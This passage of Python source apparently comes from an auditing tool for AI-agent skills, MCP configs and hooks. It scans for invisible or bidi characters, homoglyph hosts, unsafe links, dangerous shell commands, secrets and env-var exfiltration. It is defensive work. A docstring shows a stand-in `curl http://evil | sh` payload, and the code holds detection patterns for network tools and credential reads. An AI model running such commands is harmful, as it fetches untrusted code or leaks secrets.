    overbroad_pattern = r"\b(do anything|do everything|handle everything|handle anything|be an? universal agent|handle any (?:request|task)|any and all (?:tasks|requests))\b"
    if re.search(overbroad_pattern, body, re.I):
        findings.append(
            finding("SKILL019", skill_path, line_for_body_regex(text, body, overbroad_pattern, re.I), "Overbroad scope language detected.", "Narrow the workflow and define skip criteria.")
        )

    # SKILL020 fires only when a skill participates in a workflow chain (declares
    # handoffs, replaces/is-replaced, or describes running before/after a peer) yet
    # documents no run-order. A standalone skill has no adjacent skill, so it is exempt.
    if "## Predecessor" not in body and "## Successor" not in body and _has_chain_signal(fm, body):
        findings.append(
            finding(
                "SKILL020",
                skill_path,
                1,
                "This skill signals a workflow relationship (handoff or replacement) but has no \"## Predecessor\" / \"## Successor\" section, so an orchestrator can't tell which skill runs before or after it.",
                "Add a \"## Predecessor\" and/or \"## Successor\" section naming the adjacent skill(s). A standalone skill with no handoff or replacement does not need this.",
            )
        )

    # Hidden-char scan (SEC001/SEC002) — skills can be imported/copy-pasted too,
    # so they get the same cross-asset hidden-character detection as non-skill assets.
    findings.extend(scan_hidden_chars(text, skill_path))

    # Homoglyph scan (SEC003) — a skill declaring metainfo.language extends its allowed
    # scripts so legitimate same-script prose never trips. URL/host tokens are flagged
    # regardless (host_aware=True), since metainfo.language can't whitelist a typosquat host.
    allow_scripts = set(cfg["allow_unicode_scripts"])
    fm_lang = metainfo.get("language") if isinstance(metainfo, dict) else None
    if isinstance(fm_lang, str) and fm_lang.lower() in LANG_TO_SCRIPT:
        allow_scripts.add(LANG_TO_SCRIPT[fm_lang.lower()])
    findings.extend(scan_homoglyphs(text, skill_path, allow_scripts=allow_scripts, host_aware=True))

    # Reference-safety scan (REF001-REF004): unsafe script refs + link path-safety.
    # Resolve relative targets against the audit root when known, else the skill's
    # own install/toolkit root — both REF002/REF004 also fall back to the skill dir.
    ref_root = Path(root).expanduser().resolve() if root is not None else toolkit_root()
    findings.extend(scan_references(text, skill_path, ref_root,
                                    set(load_manifest_basenames()), set(cfg["allow_domains"])))

    # MCP tool↔server consistency (MCP001/MCP002): mcp__ usage + metainfo.requires.mcp
    # both live on skills, so the check runs here against the parsed frontmatter.
    findings.extend(scan_mcp_consistency(body, fm, skill_path))

    if profile == "security":
        kept = [f for f in findings if f.rule_id in cfg["security_profile"]]
    elif profile == "quality":
        kept = [f for f in findings if f.rule_id not in cfg["quality_exclude"]]
    else:
        kept = findings

    return {
        "kind": "skill-audit",
        "profile": profile,
        "generated_at": utc_now(),
        "engine_version": engine_version(),
        "rules_version": load_rule_catalog()["version"],
        "target": as_posix(skill_path),
        "summary": summarize_findings(kept),
        "findings": enrich_findings([asdict(f) for f in kept]),
    }


def safe_read_asset(path: Path, root: Path) -> str | None:
    """Read a file ONLY if it is a regular file inside root and under the size cap.
    Returns None (skip) for symlink-escape, non-regular (FIFO/device), oversize."""
    try:
        resolved = path.resolve()
        if not is_within_root(resolved, root):
            return None
        st = resolved.stat()
        if not _stat.S_ISREG(st.st_mode) or st.st_size > MAX_READ_BYTES:
            return None
        return resolved.read_text(encoding="utf-8", errors="replace")
    except OSError:
        return None


def _is_credential_path_label(label: str) -> bool:
    """True when the matched SECRET_PATTERNS label is the credential-file-path one."""
    return label == "credential path"


# Bidi embeddings/overrides/isolates + the three directional marks (LRM/RLM/ALM).
BIDI_CONTROLS = {0x202A, 0x202B, 0x202C, 0x202D, 0x202E,
                 0x2066, 0x2067, 0x2068, 0x2069,
                 0x200E, 0x200F, 0x061C}


def _is_tag_or_variation(cp: int) -> bool:
    return (0xE0000 <= cp <= 0xE007F          # Unicode tag chars (invisible smuggling)
            or 0xFE00 <= cp <= 0xFE0F          # variation selectors
            or 0xE0100 <= cp <= 0xE01EF)       # variation selectors supplement


def nfkc(text: str) -> str:
    """NFKC normalization — folds fullwidth/compatibility lookalikes to ASCII so the
    dangerous/secret regexes cannot be bypassed with e.g. fullwidth 'rm -rf /'."""
    return unicodedata.normalize("NFKC", text)


def scan_hidden_chars(text: str, path: Path) -> list[Finding]:
    """Flag bidi controls (SEC001) and invisible/format/tag/variation chars (SEC002).
    Category-based (unicodedata 'Cf') so it catches the whole class, not a fixed list."""
    out: list[Finding] = []
    for off, ch in enumerate(text):
        cp = ord(ch)
        # BIDI controls are themselves category Cf — this branch MUST come first so
        # they report as SEC001 (reorder threat), not the generic SEC002.
        if cp in BIDI_CONTROLS:
            out.append(finding("SEC001", path, line_for_offset(text, off),
                               f"Bidirectional/direction control U+{cp:04X} detected.",
                               "Remove the directional control character; it can hide or reorder text from reviewers."))
        elif unicodedata.category(ch) == "Cf" or _is_tag_or_variation(cp):
            out.append(finding("SEC002", path, line_for_offset(text, off),
                               f"Invisible/format character U+{cp:04X} detected.",
                               "Remove invisible characters; they can hide injected instructions."))
    return out


def scan_security(text: str, path: Path, *, dangerous_id: str, secret_id: str, prose: bool = True) -> list[Finding]:
    """Reusable secret + dangerous scan for any asset body. For non-prose assets
    (mcp/plugin/hook/script) the is_detection_context exemption is disabled.

    NFKC strategy: the raw text is scanned first (accurate line numbers, existing
    behavior). Then an NFKC-normalized copy is scanned as an ADDITIONAL pass to
    catch fullwidth/compatibility lookalikes (e.g. fullwidth 'rm -rf /') that only
    become matchable after folding. NFKC can change string length, so its offsets
    do not map back to the raw text — these bypass-only findings are reported at
    line 1. A (rule_id, matched-substring) seen-set deduplicates, so a pattern that
    already matched in the raw pass is never double-reported by the NFKC pass."""
    cfg = load_config()
    out: list[Finding] = []
    normalized = nfkc(text)

    def _scan(src: str, *, normalized_pass: bool, seen: set[tuple[str, str]]) -> None:
        for label, pattern, suggestion in cfg["dangerous_patterns"]:
            for m in pattern.finditer(src):
                if prose and is_detection_context(line_text_for_offset(src, m.start())):
                    continue
                key = (dangerous_id, m.group(0))
                if key in seen:
                    continue
                seen.add(key)
                line = 1 if normalized_pass else line_for_offset(src, m.start())
                out.append(finding(dangerous_id, path, line,
                                   f"Potentially dangerous instruction detected: {label}.", suggestion))
        for label, pattern in cfg["secret_patterns"]:
            for m in pattern.finditer(src):
                if prose and is_detection_context(line_text_for_offset(src, m.start())):
                    continue
                # Split credential-PATH matches (medium SEC012) from inline-secret values (high SEC011).
                rid = "SEC012" if (secret_id == "SEC011" and _is_credential_path_label(label)) else secret_id
                key = (rid, m.group(0))
                if key in seen:
                    continue
                seen.add(key)
                sugg = ("Reference credential files by documented config, not inline."
                        if rid == "SEC012" else
                        "Remove inline secrets and refer to environment variable names only.")
                line = 1 if normalized_pass else line_for_offset(src, m.start())
                out.append(finding(rid, path, line,
                                   f"Potential secret or credential reference detected: {label}.", sugg))

    seen: set[tuple[str, str]] = set()
    _scan(text, normalized_pass=False, seen=seen)
    if normalized != text:
        _scan(normalized, normalized_pass=True, seen=seen)
    return out


# An mcp__<server>__<tool> token. Server name is lowercase alnum + dash/underscore.
_MCP_TOKEN_RE = re.compile(r"mcp__([a-z0-9_-]+)__")
# Fenced code block (```...```) and inline-code span (`...`) — usage inside these
# is documentation/example, not a real tool call, so it must not count toward MCP001.
_FENCED_CODE_RE = re.compile(r"```.*?```", re.S)
_INLINE_CODE_RE = re.compile(r"`[^`\n]*`")


def _mask_code_spans(text: str, *, mask_inline: bool = True) -> str:
    """Replace code spans with same-length blanks (newlines kept) so offsets stay
    stable for line-number/detection-context resolution.

    Always masks FENCED blocks (```...``` — multi-line examples). `mask_inline`
    controls inline-code spans (`...`): the secret/danger scans mask them (a token
    in backticks is documentation), but MCP detection keeps them VISIBLE — real
    skill instructions write a tool name in backticks (`mcp__github__search`) as a
    genuine usage, so masking inline code there caused an MCP001 false negative."""
    def _blank(m: re.Match[str]) -> str:
        return "".join("\n" if ch == "\n" else " " for ch in m.group(0))
    masked = _FENCED_CODE_RE.sub(_blank, text)
    if mask_inline:
        masked = _INLINE_CODE_RE.sub(_blank, masked)
    return masked


def _declared_mcp_servers(frontmatter: dict[str, Any]) -> set[str]:
    """Servers declared in `metainfo.requires.mcp` (a list of names). Tolerant of
    missing/odd shapes — returns an empty set rather than raising."""
    metainfo = frontmatter.get("metainfo") if isinstance(frontmatter, dict) else None
    if not isinstance(metainfo, dict):
        return set()
    requires = metainfo.get("requires")
    if not isinstance(requires, dict):
        return set()
    mcp = requires.get("mcp")
    if isinstance(mcp, list):
        return {str(s).strip() for s in mcp if str(s).strip()}
    if isinstance(mcp, str) and mcp.strip():
        return {mcp.strip()}
    return set()


def scan_mcp_consistency(body: str, frontmatter: dict[str, Any], path: Path) -> list[Finding]:
    """MCP tool↔server declaration consistency.

    MCP001 (high, floor): an `mcp__<server>__` tool is USED in the body but its
    server is not DECLARED (neither in `metainfo.requires.mcp` nor the org
    `allowlists.mcp_servers`). False-positive guards: tokens inside FENCED code
    blocks (multi-line examples) are masked out, but INLINE-code spans stay visible
    — a tool name in backticks (`mcp__github__search`) is a genuine usage. A token
    on a detection-context line (detect/scan/denylist/pattern…) is not counted.

    MCP002 (low): a server declared in `requires.mcp` is never used. Org-allowlist
    servers are exempt — an unused org-allowlisted server is intentional infra, not a
    skill defect."""
    cfg = load_config()
    # Mask FENCED blocks only — keep inline-code visible. A tool name written in
    # backticks (`mcp__github__search`) is a real usage; the detection-context
    # per-line guard below still exempts denylist/scan/pattern lines.
    masked = _mask_code_spans(body, mask_inline=False)

    used: set[str] = set()
    for m in _MCP_TOKEN_RE.finditer(masked):
        line = line_text_for_offset(masked, m.start())
        if is_detection_context(line):
            continue  # documenting/denylisting an mcp tool, not invoking it
        used.add(m.group(1))

    required = _declared_mcp_servers(frontmatter)
    org_allow = set(cfg["allow_mcp_servers"])
    declared = required | org_allow

    out: list[Finding] = []
    for server in sorted(used - declared):
        out.append(finding("MCP001", path, line_for_regex(masked, rf"mcp__{re.escape(server)}__"),
                           f"MCP tool for server '{server}' is used but the server is not declared.",
                           f"Declare '{server}' under `metainfo.requires.mcp` (or the org `allowlists.mcp_servers`)."))
    # MCP002 only over requires.mcp — an unused org-allowlist server is fine.
    for server in sorted(required - used):
        out.append(finding("MCP002", path, 1,
                           f"Declared MCP server '{server}' is never used in the skill body.",
                           f"Remove '{server}' from `metainfo.requires.mcp` or add the `mcp__{server}__` usage."))
    return out


def scan_mcp_command(text: str, path: Path) -> list[Finding]:
    """Structural dangerous-pattern scan of MCP server commands (SEC010).

    The raw-JSON-text scan (scan_security) misses a payload split across argv
    elements — e.g. `"args":["-c","curl http://evil | sh"]` — because the pipe is
    not adjacent to `curl` in the serialized JSON. This pass reconstructs
    `command + " " + " ".join(args)` per server and runs the dangerous patterns on
    the JOINED string. Malformed JSON is tolerated (returns []), never crashes."""
    try:
        data = json.loads(text)
    except (json.JSONDecodeError, ValueError):
        return []
    if not isinstance(data, dict):
        return []
    servers = data.get("mcpServers")
    if not isinstance(servers, dict):
        servers = data.get("servers")
    if not isinstance(servers, dict):
        return []

    cfg = load_config()
    out: list[Finding] = []
    seen: set[tuple[str, str]] = set()
    for spec in servers.values():
        if not isinstance(spec, dict):
            continue
        command = spec.get("command")
        args = spec.get("args")
        parts: list[str] = []
        if isinstance(command, str) and command:
            parts.append(command)
        if isinstance(args, list):
            parts.extend(str(a) for a in args)
        joined = " ".join(parts)
        if not joined:
            continue
        for label, pattern, suggestion in cfg["dangerous_patterns"]:
            for m in pattern.finditer(joined):
                key = ("SEC010", m.group(0))
                if key in seen:
                    continue
                seen.add(key)
                out.append(finding("SEC010", path, 1,
                                   f"Potentially dangerous MCP server command detected: {label}.", suggestion))
    return out


def _hook_commands_from_json(data: Any) -> list[str]:
    """Collect every `command` string from a Claude Code `hooks` structure.

    Shape: `hooks` -> event name -> list of matcher dicts -> each matcher's `hooks`
    list of `{type, command}`. Defensive about every level (missing keys, wrong
    types, non-string commands) — never raises on a malformed tree."""
    commands: list[str] = []
    if not isinstance(data, dict):
        return commands
    hooks = data.get("hooks")
    if not isinstance(hooks, dict):
        return commands
    for matchers in hooks.values():
        if not isinstance(matchers, list):
            continue
        for matcher in matchers:
            if not isinstance(matcher, dict):
                continue
            inner = matcher.get("hooks")
            if not isinstance(inner, list):
                continue
            for entry in inner:
                if isinstance(entry, dict):
                    cmd = entry.get("command")
                    if isinstance(cmd, str) and cmd:
                        commands.append(cmd)
    return commands


def _env_exfil_in_command(cmd: str) -> bool:
    """True when a command both reads env/credentials AND contacts a network sink —
    the same low-recall env-exfil signature used for referenced scripts (SCR001)."""
    return bool(_NETWORK_SINK_RE.search(cmd) and _ENV_SOURCE_RE.search(cmd))


def scan_hook(path: Path, root: Path) -> list[Finding]:
    """Audit hook command sources for dangerous shell (HOOK001) and secret/env-exfil
    (HOOK002).

    Two source shapes:
    - JSON settings/plugin file: parse and walk the `hooks` block, collecting every
      command string. Malformed JSON is tolerated (returns []), never crashes.
    - hooks/ script file: the whole file body is the command text.

    Each command runs through scan_security (prose=False — a hook command is code,
    not documentation), the env-source/network-sink exfil heuristic, scan_hidden_chars,
    and every configured `hook_deny` pattern. Findings are deduped by (rule_id, line,
    message)."""
    text = safe_read_asset(path, root)
    if text is None:
        return []

    if path.suffix == ".json":
        try:
            data = json.loads(text)
        except (json.JSONDecodeError, ValueError):
            return []
        commands = _hook_commands_from_json(data)
    else:
        # A hooks/ script file: the entire body is the command.
        commands = [text]

    cfg = load_config()
    out: list[Finding] = []
    seen: set[tuple[str, int, str]] = set()

    def _add(f: Finding) -> None:
        key = (f.rule_id, f.line, f.message)
        if key not in seen:
            seen.add(key)
            out.append(f)

    for cmd in commands:
        # Dangerous shell -> HOOK001, secret -> HOOK002. prose=False: no detection-
        # context exemption for executable hook commands.
        for f in scan_security(cmd, path, dangerous_id="HOOK001", secret_id="HOOK002", prose=False):
            _add(f)
        # Env-var exfiltration heuristic (env source + network sink) -> HOOK002.
        if _env_exfil_in_command(cmd):
            _add(finding("HOOK002", path, 1,
                         "Hook command reads environment/credentials and contacts a network sink — possible env-var exfiltration.",
                         "Confirm the hook does not send any secret to a network destination."))
        # Invisible/bidi characters smuggled into a command -> SEC001/SEC002.
        for f in scan_hidden_chars(cmd, path):
            _add(f)
        # Org-supplied hook denylist patterns -> HOOK001.
        for label, pattern, suggestion in cfg["hook_deny"]:
            if pattern.search(cmd):
                _add(finding("HOOK001", path, 1,
                             f"Hook command matches a denied pattern: {label}.", suggestion))
    return out


@lru_cache(maxsize=1)
def load_confusables() -> dict[str, str]:
    """Load the confusables map (single-char key -> Latin look-alike). Tolerate absence."""
    path = default_rules_path().parent / "unicode-confusables.json"
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
        return {chr(int(k, 16)): v for k, v in (data.get("confusables") or {}).items()}
    except (OSError, ValueError):
        return {}


# Language-code -> coarse script name. Lets a skill declaring metainfo.language
# extend its allow_scripts so legitimate same-script prose never trips SEC003.
LANG_TO_SCRIPT = {
    "ru": "Cyrillic", "uk": "Cyrillic", "be": "Cyrillic", "bg": "Cyrillic",
    "sr": "Cyrillic", "mk": "Cyrillic", "kk": "Cyrillic",
    "el": "Greek",
    "zh": "Han", "ja": "Han", "ko": "Hangul",
    "ar": "Arabic", "fa": "Arabic", "ur": "Arabic",
    "he": "Hebrew",
}

_SCRIPT_PREFIXES = ("LATIN", "CYRILLIC", "GREEK", "CJK", "HAN", "HIRAGANA",
                    "KATAKANA", "HANGUL", "ARABIC", "HEBREW")


def _char_script(ch: str) -> str:
    """Coarse script of a character via unicodedata.name (Latin/Cyrillic/Greek/Han/...)."""
    if not ch.isalpha():
        return "Common"
    try:
        name = unicodedata.name(ch)
    except ValueError:
        return "Common"
    for script in _SCRIPT_PREFIXES:
        if name.startswith(script):
            return "Han" if script in ("CJK", "HAN") else script.capitalize()
    return "Other"


# A "word" for homoglyph analysis is a maximal run of letters (Unicode \w minus digits/_).
# This splits markdown/code glue (meta-навыков, хочу<br/>сделать, A[Что-то) into clean
# single-script runs, so only a genuine intra-letter homoglyph (pаypal) stays one token.
WORD_RE = re.compile(r"[^\W\d_]+", re.UNICODE)
URL_RE = re.compile(r"https?://[^\s)>\]]+", re.I)


def scan_homoglyphs(text: str, path: Path, allow_scripts: set[str], host_aware: bool = False) -> list[Finding]:
    """SEC003 (medium): a Latin-majority word hiding a confusable non-Latin char.

    Pure non-Latin words never trigger (legit foreign language). URL/host tokens are
    checked regardless of allow_scripts (an attacker cannot whitelist a typosquat host
    via metainfo.language)."""
    confusables = load_confusables()
    out: list[Finding] = []
    url_spans: list[tuple[int, int]] = []
    # 1) URL/host tokens: any confusable char in a URL is suspicious regardless of language.
    if host_aware:
        for m in URL_RE.finditer(text):
            url_spans.append((m.start(), m.end()))
            bad = [ch for ch in m.group(0) if ch in confusables]
            if bad:
                out.append(finding("SEC003", path, line_for_offset(text, m.start()),
                                   f"URL/host contains confusable character(s) {''.join(bad)!r} that mimic Latin letters.",
                                   "Verify the hostname is not a homoglyph/typosquat of a trusted domain."))
    # 2) Prose words: flag a Latin-DOMINANT word that hides a minority confusable non-Latin
    #    char (the typosquat signature). A genuine foreign-language word is non-Latin-dominant
    #    and never trips — even when markdown/code punctuation glues Latin tokens to it.
    for m in WORD_RE.finditer(text):
        if any(s <= m.start() < e for s, e in url_spans):
            continue  # part of a URL — handled above
        word = m.group(0)
        scripts = {_char_script(ch) for ch in word if ch.isalpha()}
        scripts.discard("Common")
        if not scripts or scripts <= allow_scripts:
            continue  # pure allowed-script word (incl. pure foreign-language) — not a homoglyph
        # Work on the alphabetic core only (drop digits/punctuation that markdown or
        # case-suffixes glue on). Classify each letter L (Latin) / N (non-Latin).
        core = [(ch, _char_script(ch)) for ch in word if ch.isalpha()]
        latin = sum(1 for _, s in core if s == "Latin")
        nonlatin = len(core) - latin
        if latin == 0 or nonlatin == 0:
            continue  # single-script alphabetic core — never a homoglyph
        confusable_hits = [ch for ch, _ in core if ch in confusables]
        if not confusable_hits:
            continue  # mixed scripts but no look-alike char — not a typosquat vector
        # Attack signature: the non-Latin letters are INTERLEAVED with Latin or sit at the
        # WORD START. The one benign bilingual pattern is a Latin loanword stem with a
        # foreign inflectional SUFFIX (toolkit+а, manifest+ах) — a single contiguous
        # TRAILING non-Latin run on a Latin-majority stem. Everything else (p·а·ypal,
        # g·оо·gle interleaved; а·pple leading) is a homoglyph and flags.
        nl_positions = [i for i, (_, s) in enumerate(core) if s != "Latin"]
        contiguous = nl_positions == list(range(nl_positions[0], nl_positions[-1] + 1))
        trailing_suffix = contiguous and nl_positions[-1] == len(core) - 1 and nl_positions[0] > 0
        if trailing_suffix and latin >= nonlatin:
            continue  # benign loanword + trailing foreign inflection
        out.append(finding("SEC003", path, line_for_offset(text, m.start()),
                           f"Word '{word}' mixes Latin with confusable character(s) {''.join(confusable_hits)!r}.",
                           "Use a single script; confusable characters are a common phishing/typosquat vector."))
    return out


def toolkit_root() -> Path:
    """The toolkit install root — where scripts/ and references/ live. Resolved from
    the rule-catalog path so script-existence checks (REF001) work even when the audit
    root is a user project, not the toolkit itself."""
    return default_rules_path().parents[1]


@lru_cache(maxsize=1)
def load_manifest_basenames() -> frozenset[str]:
    """Runtime-manifest basenames (one per line; `#` comments + blanks ignored).
    Used by REF001 to decide whether a referenced script ships at user runtime."""
    manifest_rel = load_config()["scripts_manifest"]
    path = toolkit_root() / manifest_rel
    names: set[str] = set()
    try:
        for line in path.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if line and not line.startswith("#"):
                names.add(Path(line).name)
    except OSError:
        return frozenset()
    return frozenset(names)


# Markdown inline link: [label](target). Target stops at whitespace or close-paren so
# a trailing " \"title\"" or nested text does not bleed into the captured path.
_MD_LINK_RE = re.compile(r"\[[^\]]*\]\(\s*([^)\s]+)")
# Bare scripts/<name>.{py,sh,ps1} mention anywhere in prose (not only inside a link).
_SCRIPT_REF_RE = re.compile(r"\bscripts/[A-Za-z0-9._-]+\.(?:py|sh|ps1)\b")
# Hosts that are gitignored output / generated locations — excluded from REF004.
_REF004_EXCLUDE_PREFIXES = ("out/", "node_modules/", ".git/", "dist/", "build/", "__pycache__/")


def _is_external_url(target: str) -> bool:
    return target.lower().startswith(("http://", "https://"))


def _url_host(target: str) -> str:
    """Lowercased host of an http(s) URL, sans scheme/path/port/credentials."""
    rest = target.split("://", 1)[1] if "://" in target else target
    authority = rest.split("/", 1)[0].split("?", 1)[0].split("#", 1)[0]
    authority = authority.split("@", 1)[-1]  # drop user:pass@
    return authority.rsplit(":", 1)[0].lower() if authority else ""


def scan_references(
    text: str,
    path: Path,
    root: Path,
    manifest: set[str] | frozenset[str],
    allow_domains: set[str],
) -> list[Finding]:
    """Detect unsafe references inside an asset body: external URLs (REF003),
    path-escaping links (REF002), dangling in-repo links (REF004), and shipping
    scripts referenced off the runtime whitelist (REF001).

    Resolution mirrors safe_read_asset: a relative target is resolved against the
    asset's own directory first, then against the audit root, so a link that points
    at a sibling reference resolves the same way the runtime would load it. A target
    that resolves nowhere is a dangling REF004. REF002 (path escape) is the only
    floor rule here — it fires on any `..`-escape or absolute filesystem path."""
    out: list[Finding] = []
    asset_dir = path.parent
    tk_root = toolkit_root()

    # Collect (target, offset) candidates: markdown links + bare script mentions.
    candidates: list[tuple[str, int]] = [(m.group(1), m.start(1)) for m in _MD_LINK_RE.finditer(text)]
    candidates += [(m.group(0), m.start()) for m in _SCRIPT_REF_RE.finditer(text)]

    seen: set[tuple[str, str]] = set()  # (rule_id, target) — dedupe repeated references

    def _emit(rule_id: str, offset: int, message: str, suggestion: str, target: str) -> None:
        key = (rule_id, target)
        if key in seen:
            return
        seen.add(key)
        out.append(finding(rule_id, path, line_for_offset(text, offset), message, suggestion))

    for target, offset in candidates:
        # Anchor-only links and pure fragments are not paths.
        if not target or target.startswith("#"):
            continue
        if target.startswith("mailto:"):
            continue

        if _is_external_url(target):
            host = _url_host(target)
            if not host:
                continue
            if host.startswith("xn--") or ".xn--" in host:
                _emit("REF003", offset,
                      f"External URL host '{host}' uses punycode (xn--) — verify it is not a homoglyph/typosquat.",
                      "Confirm the destination host and add it to the audit-config domains allowlist if trusted.",
                      target)
            elif host not in allow_domains:
                _emit("REF003", offset,
                      f"External URL host '{host}' is not in the domain allowlist.",
                      "Verify the destination is trusted; add the host to the audit-config domains allowlist if intentional.",
                      target)
            continue

        # Strip any anchor fragment from a path target (file.md#section -> file.md).
        path_part = target.split("#", 1)[0]
        if not path_part:
            continue  # was a pure #fragment after split

        # REF001: a referenced shipping script off the whitelist. Resolve script
        # existence against the TOOLKIT root (scripts/ lives there, not the user project).
        script_m = re.fullmatch(r"scripts/([A-Za-z0-9._-]+\.(?:py|sh|ps1))", path_part)
        if script_m:
            basename = script_m.group(1)
            script_exists = (tk_root / "scripts" / basename).is_file()
            if script_exists and basename not in manifest:
                _emit("REF001", offset,
                      f"Referenced script '{path_part}' is not in the runtime manifest.",
                      "Add it to scripts/runtime-manifest.txt or remove the reference to an unshipped script.",
                      target)
            # A script reference is still a path — fall through for REF002/REF004 checks.

        # REF002: absolute filesystem path or `..`-escape outside root.
        is_abs = path_part.startswith("/") or re.match(r"^[A-Za-z]:[\\/]", path_part)
        candidate_asset = (asset_dir / path_part)
        candidate_root = (root / path_part)
        escapes = is_abs or (
            ".." in Path(path_part).parts
            and not is_within_root(candidate_asset, root)
            and not is_within_root(candidate_root, root)
        )
        if escapes:
            _emit("REF002", offset,
                  f"Link target '{target}' resolves outside the repository root.",
                  "Use a repo-relative path that stays within the project.",
                  target)
            continue

        # REF004: in-repo target that exists nowhere. Conservative — resolve against
        # the asset dir, the audit root, AND the toolkit/install root (where shared
        # references/ + scripts/ live per the path-resolution contract). Flag only
        # when the target resolves nowhere.
        norm = path_part.lstrip("./")
        if norm.startswith(_REF004_EXCLUDE_PREFIXES):
            continue
        if candidate_asset.exists() or candidate_root.exists() or (tk_root / path_part).exists():
            continue
        _emit("REF004", offset,
              f"Link target '{path_part}' does not exist in the repository.",
              "Fix the path or create the target file.",
              target)

    return out


# Env-read sources and network sinks for the SCR001 exfiltration heuristic. A script
# that contains BOTH an env-source AND a network-sink is flagged once (low-recall —
# it raises attacker cost, it does NOT prove exfiltration; absence ≠ safe).
_ENV_SOURCE_RE = re.compile(
    r"os\.environ(?:\.get)?|os\.getenv|\bgetenv\b|printenv|/proc/self/environ|process\.env",
    re.I,
)
_NETWORK_SINK_RE = re.compile(
    r"urllib|requests|\bsocket\b|smtplib|\bcurl\b|\bwget\b|\bfetch\b|\bnc\b",
    re.I,
)

_SCR001_MESSAGE = (
    "Env-read source and network sink coexist in a referenced script — possible "
    "env-var exfiltration. LOW-RECALL heuristic: it raises attacker cost but is NOT "
    "a guarantee; absence of this finding does not mean the script is safe."
)
_SCR001_SUGGESTION = (
    "Manually review the referenced script: confirm no environment variable or "
    "credential is sent to a network destination. This heuristic is advisory, not exhaustive."
)


def scan_script_content(script_path: Path, root: Path) -> list[Finding]:
    """Scan the CONTENT of an in-repo script referenced by an asset for danger
    (SCR002), secrets (SCR003), and env-var exfiltration (SCR001).

    safe_read_asset enforces regular-file + size cap + within-root (None → skip).
    The dangerous/secret scan reuses scan_security with prose=False (a script gets
    no detection-context exemption). SCR001 is a deliberately LOW-RECALL heuristic:
    it fires once when an env-read source and a network sink coexist (or a
    config-supplied env_exfil pattern matches). A curl|sh / base64|sh line that the
    dangerous pass already reports as SCR002 is NOT double-reported as SCR001."""
    text = safe_read_asset(script_path, root)
    if text is None:
        return []

    cfg = load_config()
    out: list[Finding] = scan_security(
        text, script_path, dangerous_id="SCR002", secret_id="SCR003", prose=False
    )
    # Lines already flagged by the dangerous pass (e.g. curl|sh) — dedupe so the
    # env-exfil pass never double-reports the same line for the same construct.
    dangerous_lines = {f.line for f in out if f.rule_id == "SCR002"}

    seen_scr001_lines: set[int] = set()

    def _emit_scr001(offset: int, message: str, suggestion: str) -> None:
        line = line_for_offset(text, offset)
        if line in dangerous_lines or line in seen_scr001_lines:
            return  # already reported here (as SCR002 or a prior SCR001)
        seen_scr001_lines.add(line)
        out.append(finding("SCR001", script_path, line, message, suggestion))

    # Org-extensible env-exfil patterns from config.
    for label, pattern, suggestion in cfg["env_exfil_patterns"]:
        for m in pattern.finditer(text):
            _emit_scr001(m.start(), f"Env-var exfiltration pattern matched: {label}.", suggestion)

    # Built-in heuristic: an env-read source coexisting with a network sink anywhere
    # in the script. Reported once, at the env-source match line.
    if _NETWORK_SINK_RE.search(text):
        env_m = _ENV_SOURCE_RE.search(text)
        if env_m is not None:
            _emit_scr001(env_m.start(), _SCR001_MESSAGE, _SCR001_SUGGESTION)

    return out


# Markdown link or bare-script reference resolving to an in-repo script (py/sh/ps1).
_REF_SCRIPT_RE = re.compile(r"(?:^|[^A-Za-z0-9._/-])((?:[A-Za-z0-9._/-]+/)?scripts/[A-Za-z0-9._-]+\.(?:py|sh|ps1))\b")


def _referenced_scripts_in_body(text: str, asset_dir: Path, root: Path) -> set[str]:
    """Return repo-relative posix paths of in-repo scripts referenced by an asset
    body (markdown links + bare scripts/<name> mentions) that resolve to a real
    regular file under the audit root."""
    out: set[str] = set()
    candidates = [m.group(1) for m in _MD_LINK_RE.finditer(text)]
    candidates += [m.group(1) for m in _REF_SCRIPT_RE.finditer(text)]
    for target in candidates:
        if _is_external_url(target):
            continue
        path_part = target.split("#", 1)[0]
        if not re.search(r"scripts/[A-Za-z0-9._-]+\.(?:py|sh|ps1)$", path_part):
            continue
        for base in (asset_dir, root, toolkit_root()):
            candidate = (base / path_part)
            if candidate.is_file() and is_within_root(candidate, root):
                out.add(_norm_rel(as_posix(candidate.resolve()), str(root)))
                break
    return out


def checks_for(asset_type_name: str, root: Path | None = None):
    """Return [(text, path)->[Finding]] callables for an asset type. scan_hidden_chars
    runs on EVERY non-skill type; the security scan runs on config/agent/hook/script;
    the reference scan runs on agent/command (skills get it directly in audit_skill)."""
    cfg = load_config()
    allow = cfg["allow_unicode_scripts"]
    default = [lambda text, path: scan_hidden_chars(text, path),
               lambda text, path: scan_homoglyphs(text, path, allow_scripts=allow, host_aware=True)]
    security_types = {"mcp-config", "plugin-config", "agent", "runtime-config", "command", "prompt"}
    # Reference-safety scan runs on asset types where links/script refs are meaningful.
    reference_types = {"agent", "command"}
    if asset_type_name in reference_types:
        ref_root = root if root is not None else Path(".")
        manifest = load_manifest_basenames()
        allow_domains = cfg["allow_domains"]
        default = default + [lambda text, path: scan_references(
            text, path, ref_root, set(manifest), set(allow_domains))]
    if asset_type_name in security_types:
        default = default + [lambda text, path: scan_security(text, path, dangerous_id="SEC010",
                                                             secret_id="SEC011", prose=False)]
    # MCP config gets an extra structural pass: dangerous patterns across the joined
    # command+args per server (catches payloads split across argv elements).
    if asset_type_name == "mcp-config":
        default = default + [lambda text, path: scan_mcp_command(text, path)]
    return default


_INLINE_IGNORE_RE = re.compile(r"<!--\s*sgt-ignore:\s*([A-Z0-9]+)\b([^>]*)-->")
_EXPIRES_RE = re.compile(r"^\d{4}-\d{2}-\d{2}$")


def _norm_rel(p: str, root: str) -> str:
    """Normalize a path to repo-relative posix for stable suppression matching."""
    try:
        rp = Path(p)
        if rp.is_absolute():
            rp = rp.relative_to(Path(root).resolve())
        return as_posix(Path(os.path.normpath(str(rp))))
    except (ValueError, OSError):
        return as_posix(Path(os.path.normpath(p)))


def _parse_inline_ignores(text: str, rel_path: str) -> dict[tuple[str, int], set[str]]:
    """Map {(rel_path, line): {rule_ids}} from <!-- sgt-ignore: RULEID ... --> markers.
    A marker applies to its own line and the line immediately below."""
    out: dict[tuple[str, int], set[str]] = {}
    for ln, line in enumerate(text.splitlines(), start=1):
        for m in _INLINE_IGNORE_RE.finditer(line):
            rid = m.group(1)
            for target in (ln, ln + 1):
                out.setdefault((rel_path, target), set()).add(rid)
    return out


def _load_ignore_doc(root: Path) -> dict[str, Any]:
    """Load references/audit-ignore.json, tolerating absence/malformation.
